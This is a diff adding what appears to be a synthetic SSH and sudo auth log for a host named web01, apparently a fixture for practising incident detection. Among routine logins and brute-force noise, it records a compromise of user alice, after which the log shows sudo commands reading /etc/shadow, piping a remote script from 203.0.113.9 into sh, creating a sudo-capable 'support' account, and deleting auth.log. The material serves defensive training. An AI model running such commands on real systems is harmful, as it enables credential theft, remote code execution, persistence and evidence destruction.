@@ -1,0 +1,85 @@
+Sep 14 02:00:03 web01 sshd[8223]: Accepted publickey for backup from 10.0.0.5 port 43746 ssh2
+Sep 14 02:00:04 web01 sshd[15719]: pam_unix(sshd:session): session opened for user backup(uid=1001) by (uid=0)
+Sep 14 05:55:00 web01 sshd[27405]: Failed password for invalid user ubuntu from 45.13.7.8 port 54864 ssh2
+Sep 14 06:00:00 web01 sshd[20782]: Connection closed by 45.13.7.8 port 40000 [preauth]
+Sep 14 08:10:44 web01 sshd[12149]: Failed password for invalid user ubuntu from 91.200.12.4 port 43848 ssh2
+Sep 14 08:54:10 web01 sshd[4648]: Failed password for alice from 10.0.0.21 port 50952 ssh2
+Sep 14 08:54:20 web01 sshd[25299]: Failed password for alice from 10.0.0.21 port 30819 ssh2
+Sep 14 08:55:02 web01 sshd[9024]: Accepted password for alice from 10.0.0.21 port 39012 ssh2
+Sep 14 08:55:03 web01 sshd[8314]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Sep 14 09:00:00 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Sep 14 09:30:00 web01 sshd[7515]: Accepted password for bob from 10.0.0.22 port 48390 ssh2
+Sep 14 09:30:01 web01 sshd[24462]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+Sep 14 11:07:00 web01 sshd[27447]: Failed password for root from 198.51.100.23 port 38667 ssh2
+Sep 14 11:07:01 web01 sshd[24911]: Failed password for root from 198.51.100.23 port 31423 ssh2
+Sep 14 11:07:03 web01 sshd[18571]: Failed password for root from 198.51.100.23 port 45054 ssh2
+Sep 14 11:07:04 web01 sshd[13403]: Failed password for root from 198.51.100.23 port 34090 ssh2
+Sep 14 11:07:05 web01 sshd[19089]: Failed password for root from 198.51.100.23 port 32582 ssh2
+Sep 14 11:07:06 web01 sshd[28177]: Failed password for root from 198.51.100.23 port 39606 ssh2
+Sep 14 11:07:08 web01 sshd[21267]: Failed password for root from 198.51.100.23 port 50599 ssh2
+Sep 14 11:07:09 web01 sshd[29236]: Failed password for root from 198.51.100.23 port 59014 ssh2
+Sep 14 11:07:10 web01 sshd[19918]: Failed password for root from 198.51.100.23 port 41850 ssh2
+Sep 14 11:07:12 web01 sshd[24087]: Failed password for root from 198.51.100.23 port 36300 ssh2
+Sep 14 11:07:13 web01 sshd[2501]: Failed password for root from 198.51.100.23 port 32279 ssh2
+Sep 14 11:07:14 web01 sshd[8467]: Failed password for root from 198.51.100.23 port 51668 ssh2
+Sep 14 11:07:16 web01 sshd[10482]: Failed password for root from 198.51.100.23 port 55331 ssh2
+Sep 14 11:07:17 web01 sshd[29027]: Failed password for root from 198.51.100.23 port 32614 ssh2
+Sep 14 11:07:18 web01 sshd[29392]: Failed password for root from 198.51.100.23 port 37628 ssh2
+Sep 14 11:07:20 web01 sshd[13455]: Failed password for root from 198.51.100.23 port 33309 ssh2
+Sep 14 11:07:21 web01 sshd[15857]: Failed password for root from 198.51.100.23 port 39108 ssh2
+Sep 14 11:07:22 web01 sshd[28332]: Failed password for root from 198.51.100.23 port 50830 ssh2
+Sep 14 11:07:23 web01 sshd[6329]: Failed password for root from 198.51.100.23 port 41954 ssh2
+Sep 14 11:07:25 web01 sshd[12641]: Failed password for root from 198.51.100.23 port 42130 ssh2
+Sep 14 11:07:26 web01 sshd[22960]: Failed password for root from 198.51.100.23 port 36865 ssh2
+Sep 14 11:07:27 web01 sshd[23997]: Failed password for root from 198.51.100.23 port 38748 ssh2
+Sep 14 11:07:29 web01 sshd[22234]: Failed password for root from 198.51.100.23 port 52398 ssh2
+Sep 14 11:07:30 web01 sshd[20960]: Failed password for root from 198.51.100.23 port 32339 ssh2
+Sep 14 11:07:31 web01 sshd[6607]: Failed password for root from 198.51.100.23 port 50806 ssh2
+Sep 14 11:07:32 web01 sshd[24892]: Failed password for root from 198.51.100.23 port 47502 ssh2
+Sep 14 11:07:34 web01 sshd[6354]: Failed password for root from 198.51.100.23 port 38021 ssh2
+Sep 14 11:07:35 web01 sshd[13433]: Failed password for root from 198.51.100.23 port 45147 ssh2
+Sep 14 11:07:36 web01 sshd[21971]: Failed password for root from 198.51.100.23 port 38845 ssh2
+Sep 14 11:07:38 web01 sshd[19250]: Failed password for root from 198.51.100.23 port 52549 ssh2
+Sep 14 11:17:09 web01 sshd[26018]: Failed password for invalid user ubuntu from 185.220.101.9 port 37055 ssh2
+Sep 14 13:10:00 web01 sshd[25132]: Accepted publickey for alice from 10.0.0.21 port 34572 ssh2
+Sep 14 13:10:01 web01 sshd[4358]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Sep 14 14:21:06 web01 sshd[13449]: Failed password for invalid user ubuntu from 62.210.5.77 port 33039 ssh2
+Sep 14 14:40:00 web01 sshd[20349]: Failed password for bob from 10.0.0.22 port 32848 ssh2
+Sep 14 14:40:35 web01 sshd[2041]: Failed password for bob from 10.0.0.22 port 43825 ssh2
+Sep 14 14:41:10 web01 sshd[4070]: Failed password for bob from 10.0.0.22 port 30976 ssh2
+Sep 14 14:41:45 web01 sshd[8623]: Failed password for bob from 10.0.0.22 port 37164 ssh2
+Sep 14 14:45:00 web01 sshd[20726]: Accepted password for bob from 10.0.0.22 port 46559 ssh2
+Sep 14 14:45:01 web01 sshd[1869]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
+Sep 14 15:20:00 web01 sudo:    bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Sep 14 16:20:00 web01 sshd[23433]: Failed password for invalid user admin from 203.0.113.77 port 37196 ssh2
+Sep 14 16:20:20 web01 sshd[28618]: Failed password for invalid user test from 203.0.113.77 port 40626 ssh2
+Sep 14 16:20:40 web01 sshd[26427]: Failed password for invalid user oracle from 203.0.113.77 port 55176 ssh2
+Sep 14 16:21:00 web01 sshd[8505]: Failed password for invalid user postgres from 203.0.113.77 port 31832 ssh2
+Sep 14 16:21:20 web01 sshd[2051]: Failed password for invalid user ubuntu from 203.0.113.77 port 56928 ssh2
+Sep 14 16:21:40 web01 sshd[11336]: Failed password for invalid user git from 203.0.113.77 port 56379 ssh2
+Sep 14 17:06:22 web01 sshd[12270]: Failed password for invalid user ubuntu from 103.41.2.60 port 57770 ssh2
+Sep 15 02:00:04 web01 sshd[10115]: Accepted publickey for backup from 10.0.0.5 port 49309 ssh2
+Sep 15 02:00:05 web01 sshd[27523]: pam_unix(sshd:session): session opened for user backup(uid=1001) by (uid=0)
+Sep 15 03:40:00 web01 sshd[9773]: Failed password for alice from 192.0.2.99 port 43145 ssh2
+Sep 15 03:40:02 web01 sshd[7913]: Failed password for alice from 192.0.2.99 port 32168 ssh2
+Sep 15 03:40:05 web01 sshd[19585]: Failed password for alice from 192.0.2.99 port 59921 ssh2
+Sep 15 03:40:08 web01 sshd[24524]: Failed password for alice from 192.0.2.99 port 58716 ssh2
+Sep 15 03:40:10 web01 sshd[7967]: Failed password for alice from 192.0.2.99 port 40311 ssh2
+Sep 15 03:40:12 web01 sshd[17358]: Failed password for alice from 192.0.2.99 port 51477 ssh2
+Sep 15 03:40:15 web01 sshd[29989]: Failed password for alice from 192.0.2.99 port 42964 ssh2
+Sep 15 03:40:18 web01 sshd[22064]: Failed password for alice from 192.0.2.99 port 59967 ssh2
+Sep 15 03:40:20 web01 sshd[5681]: Failed password for alice from 192.0.2.99 port 45035 ssh2
+Sep 15 03:40:22 web01 sshd[5575]: Failed password for alice from 192.0.2.99 port 38679 ssh2
+Sep 15 03:40:25 web01 sshd[25411]: Failed password for alice from 192.0.2.99 port 38081 ssh2
+Sep 15 03:40:28 web01 sshd[18661]: Failed password for alice from 192.0.2.99 port 48394 ssh2
+Sep 15 03:41:05 web01 sshd[25478]: Accepted password for alice from 192.0.2.99 port 38609 ssh2
+Sep 15 03:41:06 web01 sshd[20155]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Sep 15 03:42:10 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Sep 15 03:43:30 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash -c 'curl -s http://203.0.113.9/x.sh | sh'
+Sep 15 03:45:00 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo support
+Sep 15 03:47:15 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/rm -f /var/log/auth.log
+Sep 15 09:02:00 web01 sshd[25270]: Accepted publickey for alice from 10.0.0.21 port 52174 ssh2
+Sep 15 09:02:01 web01 sshd[18870]: pam_unix(sshd:session): session opened for user alice(uid=1001) by (uid=0)
+Sep 15 09:05:00 web01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /var/log/auth.log
+Sep 15 10:15:00 web01 sshd[23981]: Accepted password for bob from 10.0.0.22 port 51295 ssh2
+Sep 15 10:15:01 web01 sshd[18856]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
